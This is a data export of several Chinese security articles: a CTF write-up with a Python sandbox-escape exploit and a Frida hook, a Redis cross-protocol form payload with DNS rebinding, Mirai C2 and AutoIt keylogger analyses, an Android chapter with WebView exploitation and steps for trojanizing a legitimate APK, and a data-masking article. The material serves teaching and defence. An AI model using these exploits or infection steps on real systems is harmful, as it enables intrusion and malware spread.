base64.b64decode('U2hlMTFfTjZSYw==')&lt;br&gt;v4 = hashlib.sha1(username).hexdigest()&lt;br&gt;print username&lt;br&gt;print v4[:16]&lt;br&gt;&lt;/span&gt;apk用了zip伪加密，首先用010editor打开，将所有 0x50 0x4B 0x01 0x02（PK..）的位置后的第五个字节改为0，即可成功安装或解压。可参考吾爱破解的文章帖子http://www.52pojie.cn/thread-287242-1-1.html。反编译apk后发现会调用Native函数check来验证密码，直接用ida将libdemo.so打开。如下三段比较简单的加密，直接用ipython解了把上面的result的值输入手机中，即可显示“碰头地点：太白南路2号”0x04 神奇的zip这个题首先也是一个伪加密，修复后即可正常安装和解压。首先apk一启动就会调用libgeneratekey.so中的isExit函数，如果该函数返回0那么apk就退出，而ida查看isExit函数的唯一作用就是返回0。因此可以使用apktool反编译apk，将SplashActivity.smali文件中第52行的if-eqz改为if-nez，即可绕过这个检测。随后会启动MainActivity，这个类的唯一操作就是将输入的字符串传入native层的函数encodePassword中，并且显示出encodePassword返回的字符串。因此我们使用ida查看encodePassword函数。主要逻辑如下可以看出，该函数会将输入的字符串与一串经过极其复杂变形的字符串进行比较，这里我们可以不去深入研究变形的过程，因为该函数没有将输入的字符串做任何变化，而是去直接比较的，因此我们可以使用调试或者hook的方法直接将变形完的字符串打印出来。这里我用frida直接hook了encodePS函数，打印出它的返回值即可，会打印两遍，取后一次。hook代码&lt;span style=""color: rgb(0, 0, 0);""&gt;let F =   Module.findExportByName('libgeneratekey.so', 'encodePS');&lt;br&gt;Interceptor.attach(F,   {&lt;br&gt;    onLeave: function (retval) {&lt;br&gt;        let ptr = new NativePointer(retval);&lt;br&gt;        console.log(hexdump(ptr));&lt;br&gt;    }&lt;br&gt;});&lt;br&gt;&lt;/span&gt;输出：上图以l开头的字符串即为flag。Misc0x01 Try Everything这题并不难，直接解压后发现是乱的然后扔binwalk，得到文件名和偏移量，脚本分解出文件然后按照文件名排序解出并且合并文本0x02 挣脱牢笼Python沙盒逃逸题。一开始设想用[].__class__.__base__.__subclasses__()[40]来使用file读文件。后来发现他命令限制长度50，非常蛋疼。后来才发现可以直接设定__builtins__变量来把指令分成多条进行，就不会受这个限制了。最后的exp如下：&lt;span style=""color: rgb(0, 0, 0);""&gt;__builtins__['ww']=().__class__.__base__&lt;br&gt;__builtins__['w']=ww.__subclasses__()&lt;br&gt;w[40]('./flag.txt').read();print k&lt;br&gt;&lt;/span&gt;Forensics0x01蒲公英的约定Stegsolve打开，里面有张二维码，反色下就好了扫码后base320x02什么鬼Binwalk可以看到一个zip密码长度4位，直接爆破，密码：19bZ解开后将右边的块补上即可0x03客官，听点小曲儿？         那个http的头里发现了： 直接用mp3stego decode掉得到：可见字符，顺序乱了，考虑栅栏，长度为6的试了不行，后面应该长度有些许变化，手动切割，得到flag：&lt;span style=""color: rgb(0, 0, 0);""&gt;a=""fdc3_# l{tsf# ahfte} gS:en _hmgc X_poe""&lt;br&gt;   b=a.split("" "")&lt;br&gt;   s=""""&lt;br&gt;   for i in   range(6):&lt;br&gt;       for j in b:&lt;br&gt;           if i &lt; len(j):&lt;br&gt;               s+=j[i]&lt;br&gt;   print s&lt;br&gt;&lt;/span&gt;本文由 安全客 原创发布，如需转载请注明来源及本文地址。本文地址：http://bobao.360.cn/learning/detail/3019.html","2016-09-11 14:48:08","CTF专题","【技术分享】最新2016华山杯CTF writeup","http://nsoad.com/Article/CTF/20160911/373.html"
"5ccbfb664f2f0a0a7a69c15d","如果你是一名开发人员，平时可能在本地会运行一些数据库服务，比如Redis,、Memcached、Elasticsearch之流。相信很多产品都会依赖这一类的服务。但是你可能不知道，这些本地","blackhold","如果你是一名开发人员，平时可能在本地会运行一些数据库服务，比如Redis,、Memcached、Elasticsearch之流。相信很多产品都会依赖这一类的服务。但是你可能不知道，这些本地运行的服务能跟你在外网访问的网站进行通信，黑客也许能借此从你本地服务中窃取数据。攻击如何生效的虽然笔者下面要讲的并不是新的东西，但攻击利用方法其实还是比较新颖的，因为以前很少有人把这些攻击组合在一起。在这里，我将结合两种不同技术进行测试，即“跨协议脚本”+“DNS重新绑定”。跨协议脚本（cross protocol scripting）第一种技术我们称之为“跨协议脚本”，有人在2001年曾经放出过这种攻击的细节。简单解释下攻击原理，那就是Redis、Memcached都存在一个简单的命令行协议，它会忽略无效的命令内容。这意味着，你的浏览器如果发送下面的HTTP请求到你本地的redis（localhost:6379），redis就会执行相应的SET命令。POST / HTTP/1.1Host: localhost:6379SET abc 123QUIT恶意站点可以通过下面的form表单，借助你的手给你本地的redis发送恶意请求：&lt;form enctype=""text/plain""method=""POST"" action=""http://localhost:6379""&gt;&lt;textarea name=""abc""&gt;SET abc 123QUIT&lt;/textarea&gt;&lt;input type=""submit""value=""Submit"" /&gt;&lt;/form&gt;而Elasticsearch协议则完全是基于HTTP，所以在通信时没有什么特别的技巧和需要注意的地方。但是我们在执行上面的测试命令时，实际上是不能直接收到结果的。这是因为浏览器的同源策略，会在你发送请求给另一个域时，能进行限制让你无法取得返回的数据。那么，现在我们就需要用到上面讲的另外一门技术了。DNS重绑定（DNS Rebinding）简单解释下，DNS重绑定的攻击原理就是字面的意思，我们采用某种手段重新更新一下DNS A记录，绑定为别的地址。为了绕过同源策略的保护，我们可以使用DNS重绑定技术，这种攻击需要一台跟你相对TTL值很低的服务器作为域名站点。一旦你浏览器访问了恶意网站，站点上的恶意代码会在特定的时刻，突然将站点DNS记录更改到另外一个的IP地址，比如你私有的IP地址（127.0.0.1），该恶意站点就能借此窃取你本地服务里面的数据。当然，这前提是在它访问你本地的服务时，能够通过相应的认证授权。POC代码我在extractdata.club网站上插入了攻击的POC代码，它会主动尝试连接你本地默认端口的Redis, Memcached和Elasticsearch服务。大约一分钟后，这个网站会返回类似于下面的页面。这里的POC只会接收服务的版本信息，并不会去漫游你整个数据库，咱们的POC代码在这里。修复方案很遗憾其实没有特别好的办法来解决这个问题，但是我们可以试着为本地运行的服务设置密码。笔者还想出了一个办法，那就是对于Redis和Memcached这两种服务，只要检测到连接是通过HTTP请求发送来的，就可以立即阻止并退出。对于浏览器方面来讲，厂商可以在浏览器里面实现“DNS阻塞（DNS pinning）”。简单来说就是，一旦某个网站被加载完成，浏览器就需要忽略其DNS的变化。浏览器厂商也可以把Redis和Memcached端口加入它们阻塞的端口列表中，现在已经在列表中的常见协议有SMTP和IRC。当然，这办法是治标不治本，如果出现了新的服务还是会出现漏洞的。后记Chromium开发人员正在致力于移除对HTTP/0.9的支持，这样浏览器就不能从Redisand和Memcached读取数据了。然而，即使这样是这样做，黑客仍然可以进行远程命令执行。对某些开发者来讲，本地使用的测试数据库里可能不会有太多有价值的东西。但黑客一旦拥有了读写权限，可能会对开发者的电脑进行远程代码执行操作。比如，黑客可以用恶意的payload覆盖疑似Ruby marshalled或者Python pickled数据，这样开发者的电脑就可能会沦陷。结论这个POC证明了计算机安全是很难得到绝对的保证的。有的时候，软件单独工作的时候看起来会很安全，但它们在交互时就可能就会产生一定的漏洞。相关阅读跨协议脚本DNS重绑定在Rails使用DNS重绑定","2016-09-01 15:55:39","网络安全","如何“组合拳”渗透开发者的本地数据库","http://nsoad.com/Article/Network-security/20160901/343.html"
"5ccbfb664f2f0a0a7a69c15e","之前的文章中已经提及，我们的僵尸网络跟踪系统对mirai僵尸网络控制主机做了持续跟踪，并且在文章的结尾处，依据跟踪结果排除了僵尸网络操作者位于北京时区的可能。在这篇","Kong","之前的文章中已经提及，我们的僵尸网络跟踪系统对mirai僵尸网络控制主机做了持续跟踪，并且在文章的结尾处，依据跟踪结果排除了僵尸网络操作者位于北京时区的可能。在这篇文章中，我们将进一步分析mirai僵尸网络的控制主机的行为和特征。之前文章链接如下：http://blog.netlab.360.com/a-dyn-twitter-ddos-event-report-and-mirai-botnet-review/目前为止，我们与安全社区合作共享了两位数域名上的超过50个mirai僵尸网络主控。但本文后面的分析仅针对360网络安全研究院独立发现的主控，即13个域名上的16个主控主机名，其中8个在持续对外发起攻击。在时间线上，我们可以看到各主控随时间变化的注册、在DNS中首次出现、持续保持IP地址变化、首次被监控到发起攻击等事件。地理分布方面，主控的IP地理分布主要在欧洲和美国，尤以欧洲为甚，亚洲很少，这从侧面增强了之前“mirai控制者不在北京时区”的判断。域名注册信息方面，绝大多数主控在域名注册时在TLD、注册局、注册邮箱方面设置了多重障碍阻滞安全社区的进一步分析。主控中一个特例是santasbigcandycane.cx，这个域名随着mirai源码泄漏而暴露在大众视野中。KrebsOnSecurity 对这个域名做了深入而有趣的探索。感兴趣的读者可在读完本篇文档后阅读： https://krebsonsecurity.com/2016/10/spreading-the-ddos-disease-and-selling-the-cure/#more-36538所分析的mirai控制端列表到目前为止，我们独立发现了16个僵尸网络主机名，分布在13个域名上，如下表所示。出于安全考虑，我们掩去了关键信息。除了少数两个特例以外，绝大多数主机名所属域名下的所有其他主机名也都完全为 mirai 服务，可据此判定绝大多数域名是专门为了mirai而申请注册的。特例之一是santasbigcandycane.cx，前文已述；特例之二是 contabo.host ，这个域名属于 Contabo.com，是一家提供低成本虚拟主机和Web空间的网络提供商。合理推测这是一台被攻破的虚拟主机，攻破后被用作mirai的控制端。注：域名指在注册局注册的域名，主机名指域名所有者获得域名控制权后分配的子域名。mirai主控的时间变化情况回溯Mirai控制端的活动历史，可以绘制mirai控制端的活动时间线如下图。考虑到大家主要关注mirai近期活动，我们缩放了下图时间轴，主要显示9月1日至今（10月27日）。图中，四个图标分别表示域名注册、主机名在DNS系统中活跃的时间、主机名在DNS系统中发生IP地址变化、跟踪到该主机名发起攻击。其中最后一个主控，我们无法追踪到最初显示的注册时间，目前查到的注册时间在其DNS首次出现时间之后。从上图中可以看出域名一旦启用（观察到参与攻击）会快速更换IP地址，一般可以判定这是攻击者在逃避安全社区的分析。以某个被认为发起了针对本次 dyn / twitter 攻击的mirai主控为例，下表是该主控的IP变化历史：图中还可以看到我们累积监控到8个主控对外发起攻击。时间可以回溯到2016年10月18日，并一直持续到当前。另外由于mirai僵尸网络规模特别大，单个主控要应对的bot较多（合理推测数目在万级），我们有理由相信mirai主控与bot之间的通讯模型与既往其他僵尸网络都有所不同。mirai主控的IP地理分布之前社区里关于这些域名的IP地址变化有一种说法，认为 “某个mirai主控变换IP地址后，原先的IP地址上会出现一个新的域名，仍然是mirai主控”，即不同主控之间共享IP地址。在我们的数据中，上述情况完全没有出现。 前文已经提到这些域名在快速的变换IP，我们持续跟踪的16个主控目前为止一共使用了98个IP地址，其中活跃的8个主控一共使用了57个IP地址。这些IP地址的国家和地区分布如下：可以看出绝大部分IP分布在欧洲和北美（巴尔及利亚，加拿大，丹麦，法国，德国，匈牙利，意大利，荷兰，罗马尼亚，俄罗斯，苏伊士，英国，美国），其中又以欧洲为甚，分布在亚洲区的只有3个。这从侧面增强了之前“mirai控制者不在北京时区”的判断。mirai主控的域名注册信息Mirai的控制者在域名注册方面非常小心，以避免被跟踪。一方面选择很少见的新Top Level Domain（TLD），另一方面所使用的注册邮箱、注册局也都强调隐私保护或者很难继续追踪。TLD的分布上，较少用常见的 .net .org 。 .xyz .work这样的TLD就已经少见，而 .racing 这样就 是更加罕见了。全部域名在常见 TLD (.net .org)上只有23%（=3/13），即使加上上.ru也不超过50%，如下图所示： 注册邮箱和注册局方面情况如下。同样出于安全考虑，我们掩去了关键信息。这些注册邮箱都比较难以继续追溯下去：Protonmail 是专门强调数据安全的邮件服务商，reg.ru, r01.ru,whoisguard.com 是专门做域名隐私保护的公司，contabo是VPS提供商，freenom运营了大量免费域名。特别要提及，info@namecentral.com 这个注册局很特殊，在上文提到的krebsonSecurity 连接中，Krebs提到这个注册局上注册的30+域名中大多含有 boot/stress/dos 这样的字眼，通常这暗示域名从事ddos出租服务；Krebs提到的另一个疑点是这个注册局注册的域名太少，无法做到收支平衡。Krebs与注册局的所有者取得联系，对方对Krebs的疑问有所回答，这更进一步加强了Krebs的疑虑。如果您已经读到这里，我们强烈建议您去阅读此文[点击此处]。","2016-10-28 15:39:40","网络安全","关于mirai僵尸网络控制主机的数据分析","http://nsoad.com/Article/Network-security/20161028/656.html"
"5ccbfb664f2f0a0a7a69c15f","在本章中，我们将了解一些不太知名的 Android 攻击向量，这在 Android 渗透测试中可能很有用。 我们还将涵盖一些主题，如 Android 广告库中的漏洞和 WebView 实现中的漏洞。","Aditya Gupta","本文来源：看雪学院  编译作者：飞龙使者   原文：Learning Pentesting for Android Devices  网络攻防小组Kong.整理发布在本章中，我们将了解一些不太知名的 Android 攻击向量，这在 Android 渗透测试中可能很有用。 我们还将涵盖一些主题，如 Android 广告库中的漏洞和 WebView 实现中的漏洞。 作为渗透测试者，本章将帮助你以更有效的方式审计 Android 应用程序，并发现一些不常见的缺陷。7.1 Android WebView 漏 洞WebView 是一种 Android 视图，用于在应用程序中显示 Web 内容。 它使用 WebKit 渲染引擎，以便使用 file// 和 data// 协议显示网页和其他内容，可以用于从文件系统加载文件和数据内容。WebView 也用于各种 Android 应用程序，例如提供注册和登录功能的应用程序。它通过在应用程序的布局中构建其移动网站，来显示应用程序中的 Web 内容。 我们将在下一章中进一步讨论 WebKit 及其渲染引擎。 对于本章，我们将只关心使用 WebKit 的那些应用程序。在应用中使用 WebView在应用程序中使用 WebView 非常简单和直接。 假设我们希望我们的整个活动都是一个 WebView 组件，从 http://examplewebsite.com 加载内容。下面是在 Android 应用程序中实现 WebView 的代码示例：WebView webview = new WebView(this);setContentView(webview);webview.loadUrl(""http://vulnerable-website.com"");另一个重要的事情是，大多数开发人员最终为了增强应用程序的功能，在 WebView 实现中使用以下命令启用 JavaScript（默认设置为 False）：setJavascriptEnabled(true);前面的命令确保 JavaScript 可以在应用程序中执行，并利用注册界面。识 别 漏 洞想象一下这种情况，应用程序在不安全的网络中使用，允许攻击者执行中间人攻击（更多中间人攻击的内容请参见 OWASP 网站 https//www.owasp.org/index.PHP/Man-in-the-middle_attack）。 如果攻击者可以访问网络，则他们可以修改请求和对设备的响应。 这表示他们能够修改响应数据，并且如果从网站加载 JavaScript 内容，则可以完全控制 JavaScript 内容。事实上，通过使用它，攻击者甚至可以使用 JavaScript 来调用手机上的某些方法，例如向另一个号码发送短信，拨打电话，甚至使用诸如 Drozer 之类的工具获取远程 shell。让我们举个简单的例子，来说明 WebView 漏洞的可能性。 在这里，我们将使用 Joshua Drake 的 GitHub 仓库（https://github.com/jduck/VulnWebView/）中的，由他创建的概念证明。 这个 POC 在应用程序中使用WebView，来简单加载一个 URL 并且加载一个位于 http://droidsec.org/addjsif.html 的网页（如果这个链接打不开，你可以访问 http//attify.com/lpfa/addjsif.html）。以下是 Eclipse 中代码示例的屏幕截图，其中使用名称 Android 创建 JavaScript 界面：我们还可以从源代码中创建 apk 文件，只需右键单击项目，然后选择 Export as an Android Application（导出为 Android 应用程序）。 一旦我们运行应用程序并监听 Burp 代理中的流量，我们将看到应用程序中指定的 URL 的请求，如以下屏幕截图所示：现在，当响应来自服务器时，我们可以修改响应数据并使用它来利用此漏洞，如以下屏幕所示让我们假设攻击者需要利用这个漏洞应用程序，来使用受害者的设备向一个号码发送短信。 以下屏幕截图显示了修改后的响应的样子：一旦我们点击 Forward（转发）按钮，邮件将从受害者的设备发送到攻击者指定的号码。上述内容简单地调用 SMSManager()，以便将包含文本 pwned 的 SMS 发送到的预定义号码。这是一个利用存在漏洞的 WebView 应用程序的简单示例。 事实上，你可以尝试调用不同的方法或使用 Drozer 从设备获取远程 shell。 你还可以访问https://labs.mwrinfosecurity.com/blog/2013/09/24/webview-addjavascriptinterface-remote-code-execution/ 阅读通过 Drozer 利用 WebView 的更多信息。7.2 感 染 合 法 APK由于 Google 的不严格政策，将应用上传到 Play 商店时，许多开发人员上传了恶意应用和软件，目的是从使用者的装置窃取私人资料。 Google Play 中存在的大多数恶意软件只是合法应用程序的受感染版本。恶意软件作者只需要一个真正的应用程序，反编译它，插入自己的恶意组件，然后重新编译它，以便分发到应用商店和感染用户。这可能听起来很复杂，但实际上，这是一个非常简单的事情。让我们尝试分析恶意软件作者如何修改合法应用程序，来创建它的受感染版本。执行此操作的最简单的方法之一是编写一个简单的恶意应用程序，并将其所有恶意活动放在服务中。此外，我们在 AndroidManifest.xml 文件中添加广播接收器，以便指定的事件（例如接收 SMS）能够触发我们的服务。因此，以下是创建受感染版本的合法应用程序的简单步骤：使用 apktool 解压缩应用程序，如下所示：apktool d [appname].apk反编译恶意应用程序来生成 Java 类的 smali 文件。 在这里，我们需要将所有的恶意活动放在服务中。 此外，如果你有 smali 语言的经验，你可以直接从 smali 本身创建服务。 假设恶意服务的名称是 malware.smali。接下来，我们需要将 malware.smali 文件复制到 smali 文件夹，它位于我们反编译的合法应用程序的文件夹中 。我们把 malware.smali 中的软件包名称的所有引用更改为合法应用程序的软件包名称，并在 AndroidManifest.xml 中注册服务。在这里，我们需要在 AndroidManifest.xml 文件中添加另一行，如下所示：&lt;service droid:name = ""malware.java""/&gt;此外，我们需要注册一个广播接收器来触发服务。 在这种情况下，我们选择短信作为触发器，如下面的代码所示：&lt;receiver android:name=""com.legitimate.application.service""&gt;      &lt;intent-filter&gt;        &lt;action android:name=""android.provider.Telephony.SMS_RECEIVED"" /&gt;    &lt;/intent-filter&gt;&lt;/receiver&gt;使用 apktool 重新编译应用，像这样：apktool b appname/一旦应用程序使用 apktool 重新编译，新的 apk 将为被感染的合法版本。 向手机发送邮件可能会自动触发此恶意软件。 如果恶意软件服务需要的权限比合法应用程序更多，我们还需要手动在 AndroidManifest.xml 文件中添加缺少的权限。7.3 广 告 库 中 的 漏 洞Google Play上提供的大部分免费 Android 应用都会使用广告来赚取收益。 然而，通常广告库本身存在漏洞，使得整个应用程序容易受到某种严重的威胁。为了识别特定应用程序中存在的广告库，我们可以使用 dex2jar/apktool 简单地反编译该应用程序，并分析创建的文件夹。 你还可以在 http://www.appbrain.com/stats/libraries/ad 中找到一些最受欢迎的 Android 广告库和使用它们的应用程序。 广告库可能具有许多漏洞，例如上一节中讨论的 WebView 漏洞，不安全的文件权限或任何其他漏洞，这可能会导致攻击者破坏整个应用程序，获得反向 shell 或甚至创建后门。7.4 Android 中 的 跨 应 用 脚 本跨应用程序脚本漏洞是一种 Android 应用程序漏洞，攻击者可以绕过同源策略并在应用程序位置中访问存储在 Android 文件系统上的敏感文件。 这意味着攻击者能够访问位于/data/data/[应用程序包名称]位置中的所有内容。 漏洞的根本原因是，应用程序允许内容使用受信任区域的访问权限，在不受信任区域中执行。如果漏洞应用程序是 Web 浏览器，攻击会变得更加严重，其中攻击者能够静默窃取浏览器存储的所有 Cookie 和其他信息，并将其发送给攻击者。甚至一些著名的应用程序，如 Skype，Dropbox，海豚浏览器等，早期版本中都存在跨应用程序脚本漏洞。让我们来看看海豚浏览器 HD 中的漏洞，例如，由 Roee Hay 和 Yair Amit 发现的漏洞。 此示例中使用的存在漏洞的海豚浏览器 HD 应用程序版本为 6.0.0，以后的版本中修补了漏洞。海豚浏览器 HD 有一个名为 BrowserActivity 的漏洞活动，它可以被其他应用程序以及其他参数调用。 攻击者可以使用它来调用海豚浏览器 HD 并打开特定的网页，以及恶意的 JavaScript。 以下屏幕截图显示了 POC 代码以及通报（http://packetstormsecurity.com/files/view/105258/dolphin-xas.txt）：这里，使用屏幕截图中的上述代码，我们将打开 http://adityagupta.NET 网站以及 JavaScript 函数 alert(document.domain)，它将在提示框中简单地弹出域名。 一旦我们在我们的手机上打开这个恶意应用程序，它将调用海豚浏览器 HD，打开 URL 和我们指定的 JavaScript 代码，如下面的截图所示：总 结在本章中，我们了解了 Android 中的不同攻击向量，从渗透测试者的角度来看，这非常有用。 本章应该用做对不同攻击向量的快速演练; 然而，建议你尝试这些攻击向量，尝试修改它们，并在现实生活中的渗透测试中使用它们。在下一章中，我们将离开应用程序层，专注于 Android 平台的基于 ARM 的利用。","2017-03-03 22:34:19","移动安全","Android 渗透测试学习手册（七）不太知名的 Android 漏洞","http://nsoad.com/Article/MobileSecurity/20170303/1092.html"
"5ccbfb664f2f0a0a7a69c160","近日，哈勃分析系统捕获到一类木马，与通常的木马不同的是，新发现的这类木马在payload中大量使用了混淆的AutoIt脚本来实现各种恶意功能，包括混淆、虚拟机检测、傀儡进程内","kong","近日，哈勃分析系统捕获到一类木马，与通常的木马不同的是，新发现的这类木马在payload中大量使用了混淆的AutoIt脚本来实现各种恶意功能，包括混淆、虚拟机检测、傀儡进程内存替换、键盘记录等行为，同时实现了包括Win2000在内的多种操作系统，以及32位和64位在内的高度兼容。以下是对此木马各阶段的详细分析。阶段一：Downloader木马的Downloader的形式最近已经屡见不鲜，依然是发送带宏的文档，引诱受害者启用宏。使用混淆过的宏脚本，从固定的网址上下载exe并运行。宏的内容本文中不详述。此外，通过域名信息进行搜索可以得知，此恶意域名伪装的是美国支付汇款网站Ria Money Transfer，并且曾经假冒该网站的名义发送过钓鱼邮件。注册此域名用的电子邮件和电话号码都是无效状态。下载下来的exe会被命名为puttyx86.exe，同时使用iTunes软件相关的文件信息伪装自己。实际上，该exe文件是一个RAR自解压包。阶段二：Extractor查看上一阶段下载的RAR包，可以发现，其自解压部分代码进行了混淆，实际功能是利用解压出来的jps.exe去执行aul-fns。其中jps.exe是一个AutoIt脚本解释器，并且带AutoIt签名，不会被安全软件报毒。而aul-fns是混淆过的autoit脚本。可是，当使用jps.exe执行这个aul-nfs以后，系统直接蓝屏了。这又是怎么回事呢？于是，尝试对压缩包中的AutoIt脚本进行解密和分析。接下来的AutoIt脚本都是经过解密后的结果。经分析，脚本运行的步骤如下：首先，读取压缩包中的另一个文件ovq.ppt，该文件为一个经过混淆的配置文件，用于配置脚本的各种功能。 接下来，脚本检查当前路径是否在temp目录下，并且检查当前没有qsq目录窗口。因为之前的puttyx86.exe会自解压到qsq目录，木马作者以此逻辑防止分析人员自己去找到这个目录。如果不满足条件，脚本则会结束系统的所有进程，并且强制重启系统。然后，脚本设置当前目录中的所有文件隐藏和只读，然后通过压缩包的另一个文件ovq.ppt的数据，解密出另一个AutoIt脚本，然后写到随机文件名的au3文件中去，最后拉起这个新的脚本。阶段三：Keylogger新的恶意脚本运行后，会将系统目录中\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe复制到\temp\RegSvcs.exe，然后读取原自解压包的另一个文件eck，并且将读取的数据附加到新复制的RegSvcs.exe文件的末尾，为傀儡进程做准备。有了修改后的RegSvcs.exe文件之后，脚本会创建并挂起新进程，创建以后Unmap原有的内存并用自己的替换，以此完成傀儡进程替换。替换时，脚本使用了DllStructCreate，DllStructGetData、DllStructSetData、DllStructGetPtr等AutoIt自己提供的接口，脚本编写起来并不复杂。  内存替换之后，RegSvcs变成了一个脚本解释器，重新执行au3脚本。新的au3脚本逻辑稍有不同，会使用CallWindowProcW来执行一段shellcode。这段shellcode的作用是记录键盘与窗口内容，然后发送到服务器。经搜索，此keylogger与知名的商业木马Limitless Keylogger比较类似，该木马目前作者已停止支持。追踪其上传时所用的C&amp;C服务器域名，只能发现使用的是一个动态域名服务，未能继续深入下去。  在拉起keylogger之前，根据配置文件的内容，木马还会先执行一些准备工作。据监测，从恶意网址下载到的木马变种较为频繁，基本上是几个小时就会变化一次。这样频繁的变种，除了改变文件特征躲避安全软件检测之外，还会使用不同的配置文件以启用不同的功能。例如，一些变种会检测虚拟机进程、判断是否存在D盘、检测Cuckoo Sandbox等，如果不满足则直接退出。另外一些变种会执行一些常见的恶意操作，比如禁用UAC、禁用任务管理器、添加自启动项等。    脚本还有很多其他功能，比如可以下载执行配置文件中的URL，但目前没有发现变种在配置文件中开启过相关选项。在分析过程中还发现，脚本支持系统非常全，包括32位、64位系统，甚至兼容Win2000。   总结此木马在运行过程中，大量使用了经过混淆的AutoIt脚本，配合RAR自解压脚本和宏，以达到躲避安全软件检测的目的。AutoIt脚本比较完整，支持包括Win2000在内的各类操作系统。木马最终会通过傀儡进程的方式，拉起一个比较成熟的keylogger，对受害者的键盘输入进行记录和回传。","2016-11-14 13:12:18","系统安全","异次元窃贼：使用AutoIt脚本进行键盘记录窃取的“新奇玩法”","http://nsoad.com/Article/system/20161114/765.html"
"5ccbfb664f2f0a0a7a69c161","前言这几天学校开始选毕业设计，选到了数据脱敏系统设计的题目，在阅读了该方面的相关论文之后，感觉对大数据安全有了不少新的理解。介绍随着大数据时代的到来，大数据中","kong","前言这几天学校开始选毕业设计，选到了数据脱敏系统设计的题目，在阅读了该方面的相关论文之后，感觉对大数据安全有了不少新的理解。介绍随着大数据时代的到来，大数据中蕴藏的巨大价值得以挖掘，同时也带来了隐私信息保护方面的难题，即如何在实现大数据高效共享的同时，保护敏感信息不被泄露。数据安全是信息安全的重要一环。当前，对数据安全的防护手段包括对称/非对称加密、数据脱敏、同态加密、访问控制、安全审计和备份恢复等。他们对数据的保护各自有各自的特点和作用，今天我主要说数据脱敏这一防护手段。许多组织在他们例行拷贝敏感数据或者常规生产数据到非生产环境中时会不经意的泄露信息。例如:1.大部分公司将生产数据拷贝到测试和开发环境中来允许系统管理员来测试升级，更新和修复。2.在商业上保持竞争力需要新的和改进后的功能。结果是应用程序的开发者需要一个环境仿真来测试新功能从而确保已经存在的功能没有被破坏。3.零售商将各个销售点的销售数据与市场调查员分享，从而分析顾客们的购物模式。4.药物或者医疗组织向调查员分享病人的数据来评估诊断效果和药物疗效。结果他们拷贝到非生产环境中的数据就变成了黑客们的目标，非常容易被窃取或者泄露，从而造成难以挽回的损失。数据脱敏就是对某些敏感信息通过脱敏规则进行数据的变形，实现敏感隐私数据的可靠保护。在涉及客户安全数据或者一些商业性敏感数据的情况下，在不违反系统规则条件下，对真实数据进行改造并提供测试使用，如身份证号、手机号、卡号、客户号等个人信息都需要进行数据脱敏。数据脱敏系统设计的难点许多公司页考虑到了这种威胁并且马上着手来处理。简单的将敏感信息从非生产环境中移除看起来很容易，但是在很多方面还是很有挑战的。首先遇到的问题就是如何识别敏感数据,敏感数据的定义是什么？有哪些依赖？应用程序是十分复杂并且完整的。知道敏感信息在哪并且知道哪些数据参考了这些敏感数据是非常困难的。敏感信息字段的名称、敏感级别、字段类型、字段长度、赋值规范等内容在这一过程中明确，用于下面脱敏策略制定的依据。一旦敏感信息被确认，在保持应用程序完整性的同时进行脱敏的方法就是最重要的了。简单地修改数值可能会中断正在测试，开发或升级的应用程序。例如遮挡客户地址的一部分，可能会使应用程序变得不可用，开发或测试变得不可靠。脱敏的过程就是一个在安全性和可用性之间平衡的过程。安全性是0%的系统中，数据不需要进行脱敏，数据库中都是原来的数据，可用性当然是100%；安全性是100%的系统中，大概所有的数据全都存一个相同的常量才能实现。所以需要选择或设计一种既能满足第三方的要求，又能保证安全性的算法就变得特别重要了。选定了敏感数据和要施加的算法，剩下的就是如何实现了，在什么过程中进行脱敏呢？难题的解决方案1.如何识别敏感数据现在有两种方式来识别敏感数据。第一种是通过人工指定，比如通过正则来指定敏感数据的格式，Oracle公司开发的Oracle Data Masking Pack中就使用了这一种方法来指定。第二种方式就是自动识别了，在文献[2]中，作者给出了基于数据特征学习以及自然语言处理等技术进行敏感数据识别的自动识别方案(没有具体的实现,只提出了模型)。具体的实现在gayhub上找了一个java实现的工程，chlorine-finder，看了下源码具体原理是通过提前预置的规则来识别一些常见的敏感数据，比如信用卡号，SSN， 手机号，电子邮箱，IP地址，住址等.2.使用怎样的数据脱敏算法在比较常见的数据脱敏系统中，算法的选择一般是通过手工指定，像Oracal的数据脱敏包中就预设了关于信用卡的数据选择什么算法进行处理，关于电话的数据怎么处理，用户也可以进行自定义的配置。脱敏方法现在有很多种，比如k-匿名，L多样性，数据抑制，数据扰动，差分隐私等。k-匿名：匿名化原则是为了解决链接攻击所造成的隐私泄露问题而提出的。链接攻击是这样的，一般企业因为某些原因公开的数据都会进行简单的处理，比如删除姓名这一列，但是如果攻击者通过对发布的数据和其他渠道获得的信息进行链接操作，就可以推理出隐私数据。k-匿名是数据发布时保护私有信息的一种重要方法。 k-匿名技术是1998 年由Samarati和Sweeney提出的 ,它要求发布的数据中存在至少为k的在准标识符上不可区分的记录,使攻击者不能判别出隐私信息所属的具体个体,从而保护了个人隐私, k-匿名通过参数k指定用户可承受的最大信息泄露风险。但容易遭受同质性攻击和背景知识攻击。L-多样性L多样性是在k-匿名的基础上提出的，外加了一个条件就是同一等价类中的记录至少有L个“较好表现”的值，使得隐私泄露风险不超过 1/L，”较好表现“的意思有多种设计，比如这几个值不同，或者信息熵至少为logL等等..但容易收到相似性攻击。数据抑制数据抑制又称为隐匿，是指用最一般化的值取代原始属性值，在k-匿名化中，若无法满足k-匿名要求，则一般采取抑制操作，被抑制的值要不从数据表中删除，要不相应属性值用“ ** ”表示。&gt;&gt;&gt; s = ""CREDITCARD""&gt;&gt;&gt; s[-4:].rjust(len(s), ""*"")'******CARD'数据扰动数据扰动是通过对数据的扰动变形使数据变得模糊来隐藏敏感的数据或规则，即将数据库 D 变形为一个新的数据库 D′ 以供研究者或企业查询使用，这样诸如个人信 息等敏感的信息就不会被泄露。通常，D′ 会和 D 很相似，从 D′ 中可以挖掘出和 D 相同的信息。这种方法通过修改原始数据，使得敏感性信息不能与初始的对象联系起来或使得敏感性信息不复存在，但数据对分析依然有效。Python中可以使用faker库来进行数据的模拟和伪造。from faker import Factoryfake = Factory.create()fake.country_code()# 'GE'fake.city_name()# '贵阳'fake.street_address()# '督路l座'fake.address()# '辉市哈路b座 176955'fake.state()# '南溪区'fake.longitude()# Decimal('-163.645749')fake.geo_coordinate(center=None, radius=0.001)# Decimal('90.252375')fake.city_suffix()# '市'fake.latitude()# Decimal('-4.0682855')fake.postcode()# '353686'fake.building_number()# 'o座'fake.country()# '维尔京群岛'fake.street_name()# 